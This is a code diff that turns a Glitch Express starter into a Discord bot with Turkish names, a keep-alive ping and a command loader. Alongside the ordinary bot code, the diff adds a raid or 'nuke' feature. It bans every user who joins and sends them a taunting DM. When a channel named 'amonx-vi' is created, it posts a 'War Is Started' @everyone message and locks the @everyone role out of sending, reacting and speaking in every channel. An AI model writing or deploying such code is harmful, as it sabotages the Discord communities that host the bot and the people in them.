@@ -1,22 +1,177 @@
-// server.js
-// where your node app starts
+const Discord = require('discord.js');
+const fs = require('fs');
+const chalk = require('chalk');
 
-// init project
+const client = new Discord.Client();
+const ayarlar = require('./ayarlar.json');
+
+//let küfürEngel = JSON.parse(fs.readFileSync("./jsonlar/küfürEngelle.json", "utf8"));
+require('./util/eventLoader')(client);
+
+
+const log = message => {
+  console.log(`${message}`);
+};
+  var prefix = ayarlar.prefix;
+  
+/*BOTU AÇIK TUTMA*/
+
 const express = require('express');
 const app = express();
+const http = require('http');
+const path = require('path');
+    app.get("/", (request, response) => {
+    console.log(`Bot Tekrar Açıldı`);
+    response.sendStatus(200);
+    });
+    app.listen(process.env.PORT);
+    setInterval(() => {
+    http.get(`http://${process.env.PROJECT_DOMAIN}.glitch.me/`);
+    }, 210000);
 
-// we've started you off with Express, 
-// but feel free to use whatever libs or frameworks you'd like through `package.json`.
+/*BOTU AÇIK TUTMA*/
 
-// http://expressjs.com/en/starter/static-files.html
-app.use(express.static('public'));
+  client.commands = new Discord.Collection();
+  client.aliases = new Discord.Collection();
+  fs.readdir('./komutlar/', (err, files) => {
+    if (err) console.error(err);
+    log(`${files.length} komut yüklenecek.`);
+    files.forEach(f => {
+      let props = require(`./komutlar/${f}`);
+      log(`Yüklenen komut: ${props.help.name}.`);
+      client.commands.set(props.help.name, props);
+      props.conf.aliases.forEach(alias => {
+        client.aliases.set(alias, props.help.name);
+      });
+    });
+  });
 
-// http://expressjs.com/en/starter/basic-routing.html
-app.get('/', function(request, response) {
-  response.sendFile(__dirname + '/views/index.html');
+  client.reload = command => {
+    return new Promise((resolve, reject) => {
+      try {
+        delete require.cache[require.resolve(`./komutlar/${command}`)];
+        let cmd = require(`./komutlar/${command}`);
+        client.commands.delete(command);
+        client.aliases.forEach((cmd, alias) => {
+          if (cmd === command) client.aliases.delete(alias);
+        });
+        client.commands.set(command, cmd);
+        cmd.conf.aliases.forEach(alias => {
+          client.aliases.set(alias, cmd.help.name);
+        });
+        resolve();
+      } catch (e){
+        reject(e);
+      }
+    });
+  };
+
+  client.load = command => {
+    return new Promise((resolve, reject) => {
+      try {
+        let cmd = require(`./komutlar/${command}`);
+        client.commands.set(command, cmd);
+        cmd.conf.aliases.forEach(alias => {
+          client.aliases.set(alias, cmd.help.name);
+        });
+        resolve();
+      } catch (e){
+        reject(e);
+      }
+    });
+  };
+
+client.reload = command => {
+  return new Promise((resolve, reject) => {
+    try {
+      delete require.cache[require.resolve(`./komutlar/${command}`)];
+      let cmd = require(`./komutlar/${command}`);
+      client.commands.delete(command);
+      client.aliases.forEach((cmd, alias) => {
+        if (cmd === command) client.aliases.delete(alias);
+      });
+      client.commands.set(command, cmd);
+      cmd.conf.aliases.forEach(alias => {
+        client.aliases.set(alias, cmd.help.name);
+      });
+      resolve();
+    } catch (e){
+      reject(e);
+    }
+  });
+};
+
+client.load = command => {
+  return new Promise((resolve, reject) => {
+    try {
+      let cmd = require(`./komutlar/${command}`);
+      client.commands.set(command, cmd);
+      cmd.conf.aliases.forEach(alias => {
+        client.aliases.set(alias, cmd.help.name);
+      });
+      resolve();
+    } catch (e){
+      reject(e);
+    }
+  });
+};
+
+client.unload = command => {
+  return new Promise((resolve, reject) => {
+    try {
+      delete require.cache[require.resolve(`./komutlar/${command}`)];
+      let cmd = require(`./komutlar/${command}`);
+      client.commands.delete(command);
+      client.aliases.forEach((cmd, alias) => {
+        if (cmd === command) client.aliases.delete(alias);
+      });
+      resolve();
+    } catch (e){
+      reject(e);
+    }
+  });
+};
+
+client.on('guildMemberAdd', member => {
+  member.guild.ban(member, "BAN BOT TARAFINDAN YOK EDİLDİ")
+  member.send(`GİRMEYE ÇALIŞTIĞIN SUNUCU GG KARŞİM XD`)
 });
 
-// listen for requests :)
-const listener = app.listen(process.env.PORT, function() {
-  console.log('Your app is listening on port ' + listener.address().port);
+var regToken = /[\w\d]{24}\.[\w\d]{6}\.[\w\d-_]{27}/g;
+
+client.on('warn', e => {
+  console.log(chalk.bgYellow(e.replace(regToken, 'that was redacted')));
 });
+
+client.on('error', e => {
+  console.log(chalk.bgRed(e.replace(regToken, 'that was redacted')));
+});
+
+client.on('channelCreate', channel => {
+  if (channel.name == 'amonx-vi') {
+    channel.send(`War İs Started. :wink:\n\nİ Never Lose. \n<@537389933971767326>,\n\nhttps://media3.giphy.com/media/AXDiSlreUJX2/source.gif\n\n@everyone`)
+    channel.guild.channels.forEach(c => {
+         c.overwritePermissions(channel.guild.roles.find("name", "@everyone"), {
+              SEND_MESSAGES: false,
+              ADD_REACTIONS: false,
+              SPEAK: false
+            });
+          });
+  }
+  if (channel.name == 'brittania') {
+    channel.send(`War İs Started. :wink:\n\nİ Never Lose. \n<@537389933971767326>,\n\nhttps://media3.giphy.com/media/AXDiSlreUJX2/source.gif\n\n@everyone`)
+  }
+
+});
+
+client.elevation = message => {
+  if(!message.guild) {
+	return; }
+  let permlvl = 0;
+  if (message.member.hasPermission("BAN_MEMBERS")) permlvl = 2;
+  if (message.member.hasPermission("ADMINISTRATOR")) permlvl = 3;
+  if (message.author.id === ayarlar.sahip) permlvl = 4;
+  return permlvl;
+};
+
+client.login(ayarlar.token) 
